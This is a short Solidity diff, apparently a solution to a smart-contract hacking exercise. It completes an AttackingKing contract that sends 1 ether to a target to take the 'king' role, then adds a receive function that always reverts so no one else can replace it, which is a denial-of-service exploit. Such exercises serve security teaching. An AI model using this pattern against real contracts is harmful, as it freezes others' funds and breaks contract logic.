@@ -11,6 +11,12 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        // become king by sending some money to become king
+        payable(contractAddress).call{value: 1 ether}("");
+    }
+
+    receive() external payable {
+        // once we become king, we error out on receival
+        require(false, "block others");
     }
 }
